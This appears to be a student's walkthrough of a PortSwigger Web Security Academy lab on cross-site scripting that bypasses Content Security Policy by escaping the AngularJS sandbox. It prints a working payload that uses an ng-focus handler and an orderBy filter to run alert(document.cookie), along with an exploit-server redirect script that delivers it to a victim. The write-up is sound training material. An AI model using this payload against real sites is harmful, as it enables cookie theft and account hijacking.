
# #PortSwigger 


![[Pasted image 20260507134843.png]]



**Description**
	*This lab uses CSP and AngularJS. To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.*

Perform a cross-site scripting attack that:
1. Bypasses **CSP** (Content Security Policy)
2. Escapes the **AngularJS sandbox**
3. Alerts `document.cookie`


---


## Solution Steps


### Step 1: Identify Problem

Website one:
- Using AngularJS
- CSP is enabled(script block)
- normal `<script>alert(1)</script>` fails
So normal XSS NOT works.





### Step 2: Construct a Payload

Concept:
```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

Go to the **exploit server** and paste the following code (replace `YOUR-LAB-ID` with your lab ID):
```
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

![[Pasted image 20260507141041.png]]

- Store and Click the Deliver exploit to victim
- checks alert fires



### Step 3: How the Payload Works - Detailed Breakdown

#### Part 1: The Input Element

```
<input id=x ng-focus="..." >
```

|Attribute|Purpose|
|---|---|
|`id=x`|Gives the input an ID to focus on|
|`ng-focus`|AngularJS event handler that executes when element receives focus|
|`#x` in URL|Automatically focuses on element with id=x|

#### Part 2: The Event Chain

```
$event.composedPath()|orderBy:'(z=alert)(document.cookie)'
```


#### Part 3: The Payload Execution

```
(z=alert)(document.cookie)
```


## Why This Bypasses CSP

| CSP Restriction                 | How It's Bypassed                                                  |
| ------------------------------- | ------------------------------------------------------------------ |
| Blocks inline scripts           | Uses AngularJS `ng-focus` event, not `<script>` tags               |
| Blocks `eval()`                 | Uses AngularJS `orderBy` filter for evaluation                     |
| Blocks `Function()` constructor | No explicit function construction needed                           |
| Restricts event handlers        | `ng-focus` is an AngularJS directive, not a standard event handler |


### Solved the Lab

![[Pasted image 20260507141506.png]]